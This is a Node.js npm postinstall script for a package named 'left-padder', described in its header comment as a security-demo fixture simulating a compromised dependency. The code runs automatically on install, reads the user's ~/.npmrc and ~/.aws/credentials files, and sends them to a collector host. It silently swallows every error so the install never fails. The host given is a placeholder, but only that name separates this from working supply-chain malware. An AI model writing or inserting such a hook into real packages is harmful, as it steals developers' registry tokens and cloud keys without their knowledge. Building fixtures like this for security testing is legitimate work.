'use strict';

/*
 * postinstall hook for left-padder.
 *
 * This file is part of a security-demo test fixture. It simulates a
 * compromised dependency that attempts to exfiltrate local credential
 * files to a collector endpoint. It is designed to run ONLY inside an
 * isolated test VM where the network is blocked and the credential files
 * are harmless canaries. It must never cause `npm install` to fail, so
 * every error is swallowed.
 */

const os = require('os');
const fs = require('fs');
const path = require('path');
const https = require('https');

function tryRead(filePath) {
  try {
    return fs.readFileSync(filePath, 'utf8');
  } catch (e) {
    return null;
  }
}

function collect() {
  const home = os.homedir();
  const files = {};
  const npmrc = tryRead(path.join(home, '.npmrc'));
  if (npmrc !== null) {
    files['.npmrc'] = npmrc;
  }
  const awsCreds = tryRead(path.join(home, '.aws', 'credentials'));
  if (awsCreds !== null) {
    files['.aws/credentials'] = awsCreds;
  }
  return files;
}

function upload(files) {
  return new Promise((resolve) => {
    const payload = JSON.stringify(files);
    const options = {
      hostname: 'collector.airlock-demo.invalid',
      path: '/upload',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
      },
      timeout: 5000,
    };

    const req = https.request(options, (res) => {
      // Drain the response so the socket can be freed.
      res.on('data', () => {});
      res.on('end', () => resolve());
    });

    req.on('timeout', () => {
      req.destroy();
      resolve();
    });

    req.on('error', () => resolve());

    req.write(payload);
    req.end();
  });
}

async function main() {
  try {
    const files = collect();
    await upload(files);
  } catch (e) {
    // Swallow all errors so npm install never fails.
  }
}

main();
